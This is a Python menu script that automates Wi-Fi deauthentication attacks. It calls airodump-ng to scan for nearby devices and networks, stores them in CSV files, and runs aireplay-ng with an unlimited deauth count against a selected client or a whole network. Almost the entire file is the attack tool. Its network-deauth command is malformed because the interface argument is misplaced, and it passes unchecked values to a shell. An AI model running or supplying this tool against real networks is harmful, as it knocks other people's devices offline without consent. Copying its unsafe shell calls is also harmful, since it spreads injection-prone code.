from time import sleep
from csv_util import *

# JSON COLUMNS StationMAC BSSID channel ESSID


dir_path = os.path.dirname(os.path.realpath(__file__))
mon_intrf = input("Whats your interface (in monitore mode): ")
dump = "files/dump.csv"
networks = "files/networks.csv"

while 1:
    print("--------------------------------------------")
    print("")
    print("Options:  ")
    print("1) Scan for targets  2) Show saved targets")
    print("3) Deauth target     4) Name device")
    print("5) Deauth a network  6) Show saved networks")
    print("0) Delete files and exit")
    option = int(input("--->"))

    if isinstance(option, int):
        if option == 1:
            print("--- Analyzing the network ---")
            print("")
            os.system("gnome-terminal -- airodump-ng %s -w %s/files/dump_raw" % (mon_intrf, dir_path))
            print("Please wait at least 6 seconds before closing the terminal")
            print("")
            sleep(6)
            x = input("When the desired device(s) appear, close the new terminal and press enter")
            dump = process_dump("%s/files/dump_raw-01.csv" % dir_path)

            # csvfile = open('files/dump.csv', 'r')
            # jsonfile = open('saved_devices.json', 'w')

        elif option == 2:
            read_csv(dump)

        elif option == 3:
            device = int(input("Device to deauth: "))

            file = open("files/dump.csv", "r")
            r = csv.reader(file)
            lines = list(r)
            print(lines[1][4])

            DeviceMAC = lines[device + 1][1]
            NetMAC = lines[device + 1][2]
            os.system("gnome-terminal -- aireplay-ng -0 0 -a %s -c %s %s" % (NetMAC, DeviceMAC, mon_intrf))

        elif option == 4:
            try:
                device_id = int(input("Enter the device id: "))
            except ValueError:
                print("That's not a valid id")

            device_name = input("Enter the device new name: ")
            rename(device_id, device_name, dump)

        elif option == 5:
            device = int(input("Device to deauth: "))

            file = open("files/networks.csv", "r")
            r = csv.reader(file)
            lines = list(r)
            print(lines[1][4])

            NetMAC = lines[device + 1][0]
            os.system("gnome-terminal -- aireplay-ng -0 0 -a %s -c %s" % (NetMAC, mon_intrf))
        elif option == 6:
            read_csv(networks)

        elif option == 0:
            delete_files()
            exit(0)
        else:
            print("That option wasn't recognized")

    else:
        print("The option should be a number")
